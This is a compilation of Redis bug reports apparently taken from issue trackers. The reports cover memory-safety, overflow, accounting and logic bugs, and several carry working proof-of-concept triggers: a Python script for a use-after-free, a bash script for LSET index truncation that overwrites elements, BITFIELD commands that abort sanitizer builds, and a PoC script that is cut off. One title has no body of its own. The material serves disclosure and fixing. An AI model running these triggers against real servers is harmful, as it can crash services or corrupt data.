title: [BUG] handleClientsBlockedOnKey() use-after-free
body:
Summary
A heap use-after-free exists in handleClientsBlockedOnKey(). While waking clients blocked on the same key, processing one client can trigger eviction that frees another client whose list node is still referenced by the iterator.
Details
handleClientsBlockedOnKey() iterates the blocked-client list:
while ((ln = listNext(&li)) && count--) {
    client *receiver = listNodeValue(ln);
    unblockClientOnKey(receiver, rl->key);
}
listNext() stores the next node before returning the current one.
unblockClientOnKey() re-executes the current client's command, entering processCommand(), which may call evictClients(), and if eviction frees the next blocked client, unblockClientWaitingData() also frees that client's list node.
The iterator still references the freed node, causing a use-after-free on the next listNext() call.
PoC
import redis, threading, time

a = redis.Redis(port=6397)
b = redis.Redis(port=6397)
c = redis.Redis(port=6397)

threading.Thread(target=a.blpop, args=("victimkey", 0), daemon=True).start()
time.sleep(.1)

p = b.pipeline(transaction=False)
p.blpop("victimkey", 0)
p.get(b"Q" * (1500 * 1024))
threading.Thread(target=p.execute, daemon=True).start()
time.sleep(.2)

c.execute_command("CLIENT", "NO-EVICT", "ON")

p = c.pipeline()
p.execute_command("CONFIG", "SET", "maxmemory-clients", "128kb")
p.lpush("victimkey", "x")

try: print(p.execute())
except redis.RedisError as e: print(e)

title: [BUG] BITFIELD signed overflow check invokes undefined behavior
body:
Describe the bug
On current unstable (b355887a4), the signed BITFIELD overflow helper computes min - value in int64_t before determining whether that threshold is needed. For a positive signed 64-bit value this evaluates INT64_MIN - value, which is undefined signed overflow.
With UBSan configured to halt, Redis aborts at src/bitops.c:625:
runtime error: signed integer overflow: -9223372036854775808 - 255 cannot be represented in type int64_t

To reproduce
Build current unstable with Clang UBSan and execute the command sequence produced by the fuzzer:
BITFIELD src SET i8 255 255 SET i64 255 255

The generated reproducer is crash-7bf9b9e76acf0bb9e8d58992c10ef52199bd4ca3 (Base64 AAUB+X3/////b//Z////////o5cDAAA=).
Expected behavior
Signed BITFIELD SET and INCRBY operations should perform overflow checks without invoking undefined behavior.
Additional information
checkSignedBitfieldOverflow() is used only by signed SET iN and INCRBY iN. In particular, any positive SET i64 value reaches the undefined subtraction. Unsigned operations and read-only operations are unaffected.
This was found by the generic bitmap fuzzer while CI was validating the recent-command fuzzing draft aviggiano/redis#205. The failing PR-triggered job and sanitizer artifact are available here.
No memory corruption was observed; this report is about remotely reachable C undefined behavior and sanitizer-build availability.

title: [BUG] Replication compression memory is invisible to client memory accounting, zstd context invisible to used_memory
body:
Version
unstable (e1cc3dc26), introduced by #15366. Needs a BUILD_COMPRESSION=yes build with repl-compression > 0 and io-threads > 1 on both ends.
Summary
When replication compression is active, each direction of the replication link allocates a compressionState: the struct, two ~128Kb temp buffers (ZSTD_CStreamInSize() / ZSTD_CStreamOutSize()), and a zstd stream context. None of it is visible in client memory accounting, and the zstd context is not visible in used_memory at all.
There are two layers to this.
1. Per-client accounting misses the compression state.
getClientMemoryUsage() in networking.c sums the output buffer, query buffer, argv and so on, but not c->compression_state, so tot-mem in CLIENT LIST / CLIENT INFO under-reports by ~262Kb per compressed link. Measured on a master with one replica at repl-compression 3, stream active:
# replica client on the master — identical with compression on and off
tot-mem=2304

The two zmalloc'd temp buffers alone are ~262Kb, so the real figure is ~294Kb.
2. The zstd context is allocated behind the allocator's back.
zstdInitCompress() in client_comp.c calls ZSTD_createCStream() without ZSTD_customMem, so the context comes from libc malloc, not zmalloc. It never shows up in used_memory, and maxmemory doesn't know about it. The context is not small — ZSTD_estimateCStreamSize() per link:

Observed on a master with a single replica at repl-compression 12 after streaming some writes:
used_memory:2250528            # 2.15M
used_memory_rss:45973504       # 43.8M
mem_fragmentation_ratio:20.60

~40Mb of real memory with nothing in used_memory to explain it. It reads as a fragmentation problem on a dashboard, but it's untracked allocations. This scales per replica, and since maxmemory is evaluated against used_memory, a memory-capped deployment can get OOM-killed by the kernel while redis believes it has headroom.
Reproduction
redis-server --port 7777 --io-threads 3 --repl-compression 12 --save '' --appendonly no
redis-server --port 7778 --io-threads 3 --repl-compression 12 --save '' --appendonly no
redis-cli -p 7778 replicaof 127.0.0.1 7777
# wait for master_link_status:up, generate some write traffic, then on the master:
redis-cli -p 7777 info memory | grep -E "used_memory:|used_memory_rss:|mem_fragmentation_ratio"
redis-cli -p 7777 client list type replica     # tot-mem

Suggested fix
For (1) I have a patch that adds the compression state (struct + temp buffers) to getClientMemoryUsage(), with a regression test under the --compression test mode, and can send a PR.
For (2) the clean route is ZSTD_createCStream_advanced() with a zmalloc-backed ZSTD_customMem, but the _advanced creators live in the ZSTD_STATIC_LINKING_ONLY section, which is not ABI-stable against a dynamically linked libzstd. Options: link zstd statically, gate on ZSTD_VERSION_NUMBER, or report an estimate in INFO instead of allocator tracking. Happy to go whichever way you prefer.

title: [BUG] XSETID ... ENTRIESADDED can create a negative consumer-group lag and an unloadable RDB
body:
Describe the bug
XSETID key <id> ENTRIESADDED n lets you lower a stream's entries_added
counter. The command validates only that the new value is not smaller than the
current stream length; it does not reconcile it against the consumer
groups' entries_read. After XTRIM shrinks the stream, entries_added can
be set below a group's entries_read, breaking the invariant
entries_read <= entries_added.
This has two observable effects:


Negative lag. XINFO GROUPS reports a negative lag
(lag = entries_added - entries_read, t_stream.c streamReplyWithCGLag).
lag is documented as a non-negative integer, or null when it cannot be
determined — it must never be negative.


Unloadable RDB (the serious one). SAVE/BGSAVE succeeds, but loading
the resulting RDB is rejected by the loader's consistency check
(rdb.c: "Stream cgroup entries_read inconsistent with entries_added"),
terminating the load. In practice this means the primary fails to restart,
replicas fail to full-sync, and RDB backups fail to restore — a single
legitimate XSETID call turns into a latent availability problem that only
fires at the next restart / resync.


To reproduce
127.0.0.1:6379> DEL st
127.0.0.1:6379> XADD st * f v1        # ... repeat to add 10 entries
127.0.0.1:6379> XGROUP CREATE st g 0
127.0.0.1:6379> XREADGROUP GROUP g c COUNT 10 STREAMS st >   # entries_read = 10
127.0.0.1:6379> XTRIM st MAXLEN 2                             # length -> 2, entries_added stays 10
127.0.0.1:6379> XSETID st <last-generated-id> ENTRIESADDED 2  # entries_added -> 2
127.0.0.1:6379> XINFO GROUPS st
   ...
   lag => (integer) -8         # <-- negative

127.0.0.1:6379> SAVE           # OK
# restart the server pointing at the saved dump.rdb:
#   # Stream cgroup entries_read inconsistent with entries_added
#   # Terminating server after rdb file reading failure.

Expected behavior
lag is never negative, and any state reachable through normal commands can be
saved and loaded again. XSETID should keep the entries_read <= entries_added
invariant, the same way XGROUP CREATE / XGROUP SETID already do.
Root cause
The invariant entries_read <= entries_added is enforced on three paths but
missing on a fourth:



path
location
behavior




RDB / RESTORE load
rdb.c (cg_offset > s->entries_added)
rejects the payload


XGROUP CREATE
t_stream.c (entries_read > s->entries_added)
clamps entries_read down


XGROUP SETID
t_stream.c (same check)
clamps entries_read down


XSETID ... ENTRIESADDED
xsetidCommand
no guard ← this bug



Because the loader validation was tightened (the rdb.c check), the previously
cosmetic "negative lag" now escalates to a fatal load failure on current builds.
Additional information

Reproduced on unstable (fatal: RDB rejected on load) and on 7.2.7
(RDB still loads there, so the symptom is "only" a persisted negative lag).
A minimal fix — clamping each group's entries_read down to the new
entries_added inside xsetidCommand, mirroring the existing XGROUP
behavior — is attached in a PR. Alternatively/additionally the lag
computation could be guarded to never return a negative value.

title: Avoid duplicate KeyMeta restoration in RESTORE-based AOF rewrites
body:
Problem
Core object types may rewrite themselves to AOF as a RESTORE command containing a DUMP-format payload. That payload normally serializes RDB-saveable module KeyMeta. After rewriting the object, rewriteObject() also calls keyMetaOnAof(), which invokes each configured KeyMeta aof_rewrite callback.
A metadata class that implements both rdb_save and aof_rewrite is therefore restored twice: once while loading the RESTORE payload and again by replaying the command emitted by its AOF callback.
KeyMeta AOF callbacks emit module-defined commands and have no idempotency requirement. Replaying one against metadata that already exists can do unnecessary allocation and callback work, leak an existing module-managed value, produce incorrect state, or fail AOF loading.
Expected behavior
For a RESTORE-based command-form AOF rewrite:

Omit all module KeyMeta from the embedded DUMP payload.
Reconstruct AOF-capable metadata exactly once through keyMetaOnAof().
Treat a class without an aof_rewrite callback as not persisted by command-form AOF, consistently with ordinary core object rewrites.
Keep normal RDB saves, DUMP, RESTORE, MIGRATE, and slot migration unchanged.
Keep normal RDB semantics when AOF uses an RDB preamble.

The skip behavior should be reusable by any core type that chooses RESTORE for command-form AOF rewrite.
Acceptance criteria

Add a DUMP-payload mode that skips all KeyMeta.
Keep rdbSaveKeyMetadata() independent of AOF callback policy.
Verify normal DUMP still carries RDB-saveable metadata.
Verify AOF RESTORE payloads carry no KeyMeta and AOF callbacks reconstruct supported classes once.
Add focused Tcl regression coverage.

KeyMeta callback cleanup: #14964
KeyMeta registration follow-up: #14967 and its merged successor #14968

Native bitmap PR and first implementation: #15331

title: MEMORY USAGE overcounts no_value=1 dict entries (dictMemUsage charges full dictEntry)
body:
Summary
dictMemUsage() charges a flat sizeof(dictEntry) (24 bytes) per entry, ignoring the no_value=1 optimization. no_value=1 dicts store a non-colliding key inline in the bucket (0 bytes allocated) or allocate a dictEntryNoValue (16 bytes) — never a full dictEntry. As a result MEMORY USAGE over-reports the size of hashtable-encoded sets, the skiplist-encoded sorted-set element index, and hashtable-encoded hashes.
kvstoreMemUsage() already accounts for this correctly, so the two accounting paths disagree today.
Details
src/dict.c:
size_t dictMemUsage(const dict *d) {
    return dictSize(d) * sizeof(dictEntry) +      /* 24 B/entry, unconditional */
        dictBuckets(d) * sizeof(dictEntry*);
}
sizeof(dictEntry) is 24 and sizeof(dictEntryNoValue) is 16. For a no_value=1 dict the true per-entry structural cost is 0 B (key stored inline in the bucket — the majority at load factor ≤ 1) or 16 B (on collision), never 24 B. The sibling helper already returns the right value:
size_t dictEntryMemUsage(int noValueDict) {
    return (noValueDict) ? sizeof(dictEntryNoValue) : sizeof(dictEntry);
}
and kvstoreMemUsage() (src/kvstore.c) already uses it:
mem += keys_count * dictEntryMemUsage(kvs->dtype.no_value) + ...
but dictMemUsage() does not.
Affected types
All three route through dictMemUsage via *TypeAllocSize → MEMORY USAGE, and all use no_value=1 dicts:

Set (OBJ_ENCODING_HT) — setTypeAllocSize (t_set.c)
Sorted set (OBJ_ENCODING_SKIPLIST element index) — zsetAllocSize (t_zset.c)
Hash (OBJ_ENCODING_HT) — hashTypeAllocSize (t_hash.c; field+value are packed into one entry stored as the inline-capable dict key)

The main keyspace is unaffected (kvstoreMemUsage is already correct). no_value=0 dicts (e.g. pub/sub and function dicts) are unchanged.
Reproduction
Force hashtable/skiplist encoding, populate 1,000,000 entries with 16-byte members, and compare MEMORY USAGE <key> SAMPLES 0 against the used_memory delta:
redis-server --set-max-listpack-entries 0 --set-max-intset-entries 0 \
             --hash-max-listpack-entries 0 --zset-max-listpack-entries 0 ...




type
MEMORY USAGE
used_memory Δ
over-report




set (HT)
50.39 B/e
38.13 B/e
12.26 B/e


zset (skiplist)
95.73 B/e
77.45 B/e
18.29 B/e


hash (HT)
70.39 B/e
54.09 B/e
16.29 B/e



The over-report is systematic and one-directional — the key/value payload and the bucket-array term are accounted correctly and cancel; the difference is purely the per-entry struct size.
Impact
MEMORY USAGE is a documented approximation and does not drive eviction (maxmemory uses used_memory), so there is no behavioral/correctness impact — only capacity-planning/introspection figures for sets, sorted sets, and hashes are inflated (by ~12–18 MB on a 1M-entry object).
Suggested fix
Make dictMemUsage() size entries with the existing no_value-aware helper, matching kvstoreMemUsage():
return dictSize(d) * dictEntryMemUsage(d->type->no_value) +
    dictBuckets(d) * sizeof(dictEntry*);
This is a strict, systematic improvement (−8 B/entry) and remains an O(1) upper bound. Crediting inline-stored keys as 0 B is intentionally not proposed — it would require an O(buckets) walk that contradicts the command's O(1) design. PR to follow.

title: [BUG] `BLMOVEM ... EXACTLY` is not woken when `SORT ... STORE` grows the list it is waiting on
body:
The Bug
BLMOVEM ... EXACTLY <n> blocks until the source list contains at least n elements.
When a client is blocked on an existing list, commands that grow the list such as LPUSH, RPUSH, LINSERT, and LMOVE correctly wake the client once enough elements are available.
SORT ... STORE is an exception. If the destination list already exists, storing into it replaces the list, but a client blocked with BLMOVEM ... EXACTLY is not reprocessed even when the new list satisfies the requested element count. The client remains blocked until its timeout (or indefinitely with a timeout of 0)
A subsequent unrelated write that does signal (e.g. a plain LPUSH) will belatedly wake the client, but by then the list contents have changed, so the client can even move the wrong elements.
The same root cause also affects plain BLPOP/BLMOVE, not just BLMOVEM ... EXACTLY. If the key SORT ... STORE overwrites did not already hold a list, no signal fires either, so a client blocked with a plain BLPOP on that key never wakes when the overwrite turns it into a list, and stays blocked until timeout. Reproduces the same way: BLPOP k 0, then SET k foo (client stays blocked, wrong type), then SORT feed STORE k (client should wake but doesn't).
Steps to reproduce
To reproduce
Client A
RPUSH dst a
BLMOVEM dst out LEFT RIGHT 0 EXACTLY 3 BULK

Client A blocks because dst contains only one element.
Client B
RPUSH src 3 1 2
SORT src STORE dst
INFO clients

SORT ... STORE replaces dst with:
[1 2 3]

but blocked_clients is still 1
If Client B now runs:
LPUSH dst x

Client A finally wakes and moves:
x 1 2

instead of the expected:
1 2 3

Expected behavior
Client A unblocked and served as soon as SORT src STORE dst makes dst hold 3 elements, returning 1 2 3 exactly as if the list had grown via LPUSH/LINSERT/LMOVE.
Actual behavior
Client A remains blocked after SORT ... STORE (blocked_clients stays 1). Only a later signalling command wakes it, by which time it may move different elements.
Additional context
This appears to happen only when SORT ... STORE overwrites an existing destination key.
Tracing through the code suggests that the overwrite path in setKeyByLink() updates the value via dbSetValue() without notifying clients waiting for an existing list to grow, whereas the key-creation path already performs the appropriate signalling.(dbAddByLink() -> dbAddInternal(), which calls signalKeyAsReady())

title: [BUG] FAST expire cycle's stale-percentage trigger is dead code since 6.0: stat_expired_stale_perc (0..1 fraction) is compared against a percentage threshold (1..10)
body:
Describe the bug
activeExpireCycle() intends to allow a FAST cycle to run when the estimated
percentage of stale (logically expired but not yet reclaimed) keys is high:
/* src/expire.c (8.2.2), activeExpireCycle() */
config_cycle_acceptable_stale = ACTIVE_EXPIRE_CYCLE_ACCEPTABLE_STALE - effort;  /* 10..1, percent units */
...
if (type == ACTIVE_EXPIRE_CYCLE_FAST) {
    /* Don't start a fast cycle if the previous cycle did not exit
     * for time limit, unless the percentage of estimated stale keys is
     * too high. ... */
    if (!timelimit_exit &&
        server.stat_expired_stale_perc < config_cycle_acceptable_stale)
        return;
However stat_expired_stale_perc is maintained as a fraction in [0, 1], not
a percentage:
/* src/expire.c, end of activeExpireCycle() */
current_perc = (double)total_expired/total_sampled;          /* 0..1 */
server.stat_expired_stale_perc = (current_perc*0.05)+
                                 (server.stat_expired_stale_perc*0.95);
INFO scales it only for display ("expired_stale_perc:%.2f", server.stat_expired_stale_perc*100
in src/server.c). Note the per-DB repeat condition inside the same function does
scale correctly (data.expired * 100 / data.sampled > config_cycle_acceptable_stale),
so the FAST gate is the one place where the units disagree.
Since 0 <= stat_expired_stale_perc <= 1 and config_cycle_acceptable_stale is
in [1, 10], the condition is always true (except the degenerate case of exactly
1.0 with active-expire-effort 10), so the branch always returns early: FAST
cycles only ever run when the previous SLOW cycle exited on its time cap
(timelimit_exit). The "estimated stale keys too high" trigger described in the
comment can never fire.
Affected: 6.0.0 (where this code was introduced) through current unstable,
byte-identical. Valkey inherits the same code.
To reproduce
Code inspection is sufficient (see above; the three relevant spots are the gate,
the EWMA update in activeExpireCycle(), and the *100 in INFO).
Runtime observation: run any workload whose INFO expired_stale_perc sits well
above the threshold (e.g. 20-30) while SLOW cycles do not hit their time cap —
expired_time_cap_reached_count stays constant and no FAST cycles occur, which
can be seen with a probe/printf on the FAST path. We hit a production state
where expired_stale_perc was pinned around 10 with a growing backlog, and the
FAST assist never engaged (details in the companion issue linked below).
Expected behavior
The gate compares like units, e.g.:
if (!timelimit_exit &&
    server.stat_expired_stale_perc * 100 < config_cycle_acceptable_stale)
    return;
(or store the EWMA in percent), so that FAST cycles actually trigger on a high
stale estimate as documented.
Additional information

Under typical workloads the miss is invisible (the SLOW repeat loop suffices),
which is presumably why it went unnoticed for ~6 years.
We found it while investigating a production incident where the active expire
cycle stalled on locally-biased samples while global staleness grew unboundedly;
the FAST path intended for exactly that situation never ran. See companion
issue: #15411.
Note on fixing: a one-line unit fix resurrects a code path dormant since 6.0
and could change CPU characteristics for workloads legitimately above the
stale threshold (a FAST cycle every ~2ms worst case). It may be worth
discussing whether to fix the comparison, retune the trigger, or remove the
dead branch explicitly.

title: [BUG] `CONFIG SET` of TLS options crashes non-TLS Redis builds via NULL connection-type deref (SIGSEGV DoS, `+config|set`-only)
[BUG] LSET overwrites list elements via out-of-range 64-bit indexes (long→int truncation)
body:
Describe the bug
LSET key index value parses index from the client argument as a C long (64-bit on Linux x86-64), but hands it to the shared replacement helper listTypeReplaceAtIndex(robj *o, int index, ...), whose index parameter is only an int (32-bit). When the caller and callee have mismatched integer widths, the value is silently narrowed at the call site: an index that is perfectly representable as a long but falls outside the 32-bit int range is truncated to its low 32 bits.
Concretely, 4294967296 (2^32) is truncated to 0, and 4294967298 (2^32 + 2) is truncated to 2. These indexes are all logically out of range for any realistic list and must be rejected with ERR index out of range. Instead LSET replies OK and silently overwrites an existing element at the truncated index. The negative analog -4294967296 also truncates to 0 on the verified 64-bit build and overwrites the head element.
This is an authenticated, remote, data-integrity issue reachable through an ordinary runtime command. It affects both list encodings:

listpack branch (lpSeek(o->ptr, index)), and
quicklist branch (quicklistReplaceAtIndex(ql, index, vstr, vlen)).

The truncation happens before either encoding path is reached, so both are equally affected.
Vulnerable code (current unstable, commit d28dd44c4):
/* src/t_list.c:641 — caller parses index as `long` */
void lsetCommand(client *c) {
    kvobj *o = lookupKeyWriteOrReply(c, c->argv[1], shared.nokeyerr);
    if (o == NULL || checkType(c,o,OBJ_LIST)) return;
    long index;                                   /* 64-bit on Linux x86-64 */
    robj *value = c->argv[3];
    ...
    if ((getLongFromObjectOrReply(c, c->argv[2], &index, NULL) != C_OK))
        return;
    ...
    if (listTypeReplaceAtIndex(o, index, value)) {  /* <-- long narrowed to int here */
        addReply(c, shared.ok);
        ...
    } else {
        addReplyErrorObject(c, shared.outofrangeerr);
    }
}

/* src/t_list.c:373 — callee accepts index as `int` */
int listTypeReplaceAtIndex(robj *o, int index, robj *value) {   /* 32-bit parameter */
    ...
    if (o->encoding == OBJ_ENCODING_QUICKLIST) {
        quicklist *ql = o->ptr;
        replaced = quicklistReplaceAtIndex(ql, index, vstr, vlen);   /* truncated index */
    } else if (o->encoding == OBJ_ENCODING_LISTPACK) {
        unsigned char *p = lpSeek(o->ptr, index);                    /* truncated index */
        if (p) {
            o->ptr = lpReplace(o->ptr, &p, (unsigned char *)vstr, vlen);
            replaced = 1;
        }
    }
    ...
}
To reproduce
The following block is a self-contained, copy-paste-runnable PoC. It launches a throwaway redis-server on a high port with persistence disabled, exercises LSET with truncating indexes against both listpack- and quicklist-encoded lists, prints OK/FAIL checks against the expected (out-of-range) behavior, and tears the server down on exit.

Requirements: a build of the vulnerable Redis available either as redis-server/redis-cli on PATH, or at ./src/redis-server / ./src/redis-cli (e.g. run make in a checkout, then run this snippet from the repo root). Verified on commit d28dd44c4, 64-bit Linux GCC build (arch_bits:64).

#!/usr/bin/env bash
# LSET long->int index truncation PoC — fully self-contained, copy/paste runnable.
set -u
PORT=17899
WORK="$(mktemp -d)"
REDIS_SERVER="${REDIS_SERVER:-$(command -v redis-server || echo "${PWD}/src/redis-server")}"
REDIS_CLI="${REDIS_CLI:-$(command -v redis-cli || echo "${PWD}/src/redis-cli")}"

cleanup() {
  "${REDIS_CLI}" -p "${PORT}" SHUTDOWN NOSAVE >/dev/null 2>&1 || true
  sleep 0.2
  rm -rf "${WORK}"
}
trap cleanup EXIT

"${REDIS_SERVER}" --port "${PORT}" --save "" --appendonly no --daemonize yes \
                  --dir "${WORK}" --logfile "${WORK}/redis.log"
sleep 0.5
"${REDIS_CLI}" -p "${PORT}" PING >/dev/null || { echo "could not reach redis-server"; exit 2; }

fail=0
check() {  # check <label> <actual> <expected>
  if [ "$2" = "$3" ]; then printf '  [ok]   %-34s got %s\n' "$1" "$2";
  else printf '  [FAIL] %-34s got %s, expected %s\n' "$1" "$2" "$3"; fail=1; fi
}

echo "=== Redis build info ==="
"${REDIS_CLI}" -p "${PORT}" INFO server | grep -E '^(redis_version|redis_git_sha1|arch_bits):'

echo; echo "=== listpack-encoded list, length 3 ==="
"${REDIS_CLI}" -p "${PORT}" DEL lp >/dev/null
"${REDIS_CLI}" -p "${PORT}" RPUSH lp a b c >/dev/null
# 4294967296 = 2^32  -> truncates to 0  (should be OUT OF RANGE)
check "LSET lp 4294967296 X reply" \
      "$("${REDIS_CLI}" -p "${PORT}" LSET lp 4294967296 X)" "ERR index out of range"
check "lp unchanged (a,b,c)" \
      "$("${REDIS_CLI}" -p "${PORT}" LRANGE lp 0 -1 | tr '\n' ',')" "a,b,c,"
# 4294967298 = 2^32 + 2 -> truncates to 2 (should be OUT OF RANGE)
"${REDIS_CLI}" -p "${PORT}" DEL lp2 >/dev/null
"${REDIS_CLI}" -p "${PORT}" RPUSH lp2 a b c >/dev/null
check "LSET lp2 4294967298 Z reply" \
      "$("${REDIS_CLI}" -p "${PORT}" LSET lp2 4294967298 Z)" "ERR index out of range"
check "lp2 unchanged (a,b,c)" \
      "$("${REDIS_CLI}" -p "${PORT}" LRANGE lp2 0 -1 | tr '\n' ',')" "a,b,c,"
# -4294967296 = -2^32 -> truncates to 0 (should be OUT OF RANGE)
"${REDIS_CLI}" -p "${PORT}" DEL lp3 >/dev/null
"${REDIS_CLI}" -p "${PORT}" RPUSH lp3 a b c >/dev/null
check "LSET lp3 -4294967296 NEG reply" \
      "$("${REDIS_CLI}" -p "${PORT}" LSET lp3 -4294967296 NEG)" "ERR index out of range"

echo; echo "=== quicklist-encoded list (multi-node) ==="
"${REDIS_CLI}" -p "${PORT}" CONFIG SET list-max-listpack-size 1 >/dev/null   # force small nodes
"${REDIS_CLI}" -p "${PORT}" DEL ql >/dev/null
for i in $(seq 1 300); do \
  "${REDIS_CLI}" -p "${PORT}" RPUSH ql "padding-padding-padding-padding-$i" >/dev/null; done
printf '  encoding: %s\n' "$("${REDIS_CLI}" -p "${PORT}" OBJECT ENCODING ql)"
before="$("${REDIS_CLI}" -p "${PORT}" LINDEX ql 2)"
check "LSET ql 4294967298 ZZZ reply" \
      "$("${REDIS_CLI}" -p "${PORT}" LSET ql 4294967298 ZZZ)" "ERR index out of range"
check "ql elem[2] unchanged" "$("${REDIS_CLI}" -p "${PORT}" LINDEX ql 2)" "${before}"
check "ql length unchanged"  "$("${REDIS_CLI}" -p "${PORT}" LLEN ql)" "300"

echo; echo "=== sanity: genuinely out-of-range index is still rejected ==="
check "LSET lp 9999999999 reply" \
      "$("${REDIS_CLI}" -p "${PORT}" LSET lp 9999999999 NOPE)" "ERR index out of range"

echo; echo "=== verdict ==="
if [ $fail -eq 0 ]; then
  echo "ALL CHECKS PASSED — bug NOT present on this build."; exit 0
else
  echo "BUG PRESENT — out-of-range long indexes were accepted and truncated to in-range int indexes."; exit 1
fi
Observed output on the vulnerable build (commit d28dd44c4, arch_bits:64). The expected reply in every LSET line is ERR index out of range; instead the server replies OK and the targeted element is overwritten:
=== listpack-encoded list, length 3 ===
  [FAIL] LSET lp 4294967296 X reply           got OK, expected ERR index out of range
  [FAIL] lp unchanged (a,b,c)                 got X,b,c,, expected a,b,c,        # index 0 overwritten
  [FAIL] LSET lp2 4294967298 Z reply          got OK, expected ERR index out of range
  [FAIL] lp2 unchanged (a,b,c)               got a,b,Z,, expected a,b,c,        # index 2 overwritten
  [FAIL] LSET lp3 -4294967296 NEG reply       got OK, expected ERR index out of range
=== quicklist-encoded list (multi-node) ===
  encoding: quicklist
  [FAIL] LSET ql 4294967298 ZZZ reply       got OK, expected ERR index out of range
  [FAIL] ql elem[2] unchanged               got ZZZ, expected padding-padding-padding-padding-3
  [ok]   ql length unchanged                got 300                               # length intact => a replace, not an append
=== sanity: genuinely out-of-range index is still rejected ===
  [ok]   LSET lp 9999999999 reply             got ERR index out of range
=== verdict ===
BUG PRESENT — out-of-range long indexes were accepted and truncated to in-range int indexes.

Equivalent bare redis-cli commands reproducing the core issue on a fresh RPUSH k a b c:
LSET k 4294967296 X      -> OK           (expected: ERR index out of range); LRANGE k 0 -1 -> X b c   (index 0 overwritten)
LSET k 4294967298 Z      -> OK           (expected: ERR index out of range); LRANGE k 0 -1 -> a b Z   (index 2 overwritten)
LSET k -4294967296 NEG   -> OK           (expected: ERR index out of range); LRANGE k 0 -1 -> NEG b c (index 0 overwritten)
LSET k 9999999999 NOPE   -> ERR index out of range   (sanity: this one *is* rejected, because 9999999999 mod 2^32 == 1410065407, still out of range for a 3-element list)

Expected behavior
Per the documented LSET contract, any index whose absolute value is greater than or equal to the list length must be rejected with ERR index out of range and leave the list unchanged. 4294967296, 4294967298, -4294967296 are all far outside the valid range for any real list, so all three LSET calls must reply ERR index out of range and the list must remain a, b, c. The list length must not change and no element may be overwritten.
Additional information
Root cause. Integer-narrowing at a call-site type mismatch. lsetCommand() parses the index into a long, but listTypeReplaceAtIndex() is declared with an int index parameter. On LP64 platforms (long 64-bit, int 32-bit) any long index whose low 32 bits land inside the valid [0, len) / [-len, len) window survives truncation as a valid in-range int index, so the boundary check that listTypeReplaceAtIndex relies on (returning 0 via lpSeek/quicklistReplaceAtIndex when nothing is found) is bypassed for these aliased values. The negative case works the same way because the narrowing reinterprets the low 32 bits as a signed int (-4294967296 → 0).
Affected versions / environment. Verified locally on the current unstable branch:
Commit:  d28dd44c49a48f007b57dd4f1b79066cb58f7132
Server:  Redis server v=255.255.255 sha=d28dd44c:0 malloc=libc bits=64 build=8a0c4e91e069711c
Platform: 64-bit Linux/GCC (LP64; long = 8 bytes, int = 4 bytes)
Encodings tested: listpack (default small list) and quicklist (forced via list-max-listpack-size 1)

On ILP32 targets where long and int are both 32-bit, getLongFromObjectOrReply() would reject the value as out of long range first, masking the bug; the issue is specific to 64-bit (bits=64) builds, which is the dominant production target per SECURITY.md.
Impact. Authenticated remote data-integrity violation. Any client authorized to run LSET on a list key can overwrite arbitrary existing elements with attacker-chosen values using indexes that the application believes will be rejected as out of range. This breaks index-boundary guarantees that callers may rely on for integrity (e.g. guarding specific slots, ring-buffer/queue slots that must not be touched by callers supplying validated offsets). Combined with keyspace notifications/replication the corrupted element is propagated to replicas and AOF/RDB, so the corruption persists. No crash or memory-safety violation was observed — purely a logical write out of the documented contract.
Suggested fix. Make the index type consistent end-to-end so no narrowing occurs. Change listTypeReplaceAtIndex() to accept a long index (matching lsetCommand's parsed type), and propagate long through quicklistReplaceAtIndex() and the lpSeek() call. If any lower-level API genuinely requires a narrower type, validate explicitly at the boundary in lsetCommand before calling — e.g. reject with ERR index out of range when the parsed long index is outside the list length (the command already has the type and can compute length), or range-check against INT_MIN/INT_MAX before the narrowing call. The cleanest minimal fix is to drop the int parameter entirely in favor of long:
int listTypeReplaceAtIndex(robj *o, long index, robj *value) {
    ...
    if (o->encoding == OBJ_ENCODING_QUICKLIST) {
        quicklist *ql = o->ptr;
        replaced = quicklistReplaceAtIndex(ql, index, vstr, vlen);  /* signature widened to long */
    } else if (o->encoding == OBJ_ENCODING_LISTPACK) {
        unsigned char *p = lpSeek(o->ptr, index);
        ...
    }
    ...
}

title: [BUG] Redis BITFIELD `#offset` Signed Overflow DoS
body:
Describe the bug
Redis BITFIELD and BITFIELD_RO support the #<offset> syntax, where the element offset is multiplied by the current bitfield width to produce the real bit offset. The runtime code performs that multiplication in signed long long before checking for negative values or the maximum string length:
/* src/bitops.c:getBitOffsetFromArgument() */
if (usehash) loffset *= bits;

if (loffset < 0 || (!mustObeyClient(c) && (loffset >> 3) >= server.proto_max_bulk_len))
{
    addReplyError(c,err);
    return C_ERR;
}
If a client supplies a #offset that is accepted by string2ll() but overflows after multiplication by the bit width, loffset *= bits triggers signed integer overflow. UBSAN builds, or hardened builds that trap signed overflow, abort the Redis process and cause a remotely triggerable denial of service.
To reproduce
Affected Runtime Code:

src/bitops.c:714: getBitOffsetFromArgument() parses bit offsets for bit commands.
src/bitops.c:721: enables multiplication for BITFIELD #<offset> syntax.
src/bitops.c:730: sink, loffset *= bits is evaluated before bounds checks.
src/bitops.c:1931: BITFIELD/BITFIELD_RO parsing calls this sink.

A client allowed to run BITFIELD_RO or BITFIELD sends a bitfield subcommand with #offset. For i64, the field width is 64, and the following offset is floor(LLONG_MAX / 64) + 1:
redis-cli BITFIELD_RO k GET i64 '#144115188075855872'
The same sink is reachable through the write command name as well:
redis-cli BITFIELD k GET i64 '#144115188075855872'
POC:
#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
TMP="$(mktemp -d /tmp/redis-bitfield-offset-overflow.XXXXXX)"
SRC="${TMP}/srcroot"

cleanup() {
    pkill -P "$$" 2>/dev/null || true
    rm -rf "${TMP}"
}
trap cleanup EXIT

need() {
    if ! command -v "$1" >/dev/null 2>&1; then
        echo "missing required command: $1" >&2
        exit 1
    fi
}

need make
need tar
need grep

echo "[1/4] Copying current Redis workspace to ${SRC}"
mkdir -p "${SRC}"
(
    cd "${ROOT}"
    tar \
        --exclude='.git' \
        --exclude='.bug_agent' \
        --exclude='bug' \
        --exclude='chain' \
        --exclude='real_bug' \
        --exclude='src/.make-*' \
        --exclude='deps/.make-*' \
        --exclude='deps/*/.make-*' \
        --exclude='src/*.o' \
        --exclude='src/*.d' \
        --exclude='src/redis-server' \
        --exclude='src/redis-server-*' \
        --exclude='src/redis-cli' \
        --exclude='src/redis-cli-*' \
        -cf - .
) | tar -C "${SRC}" -xf -

echo "[2/4] Building temporary UBSAN Redis"
make -C "${SRC}/src" \
    SANITIZER=undefined \
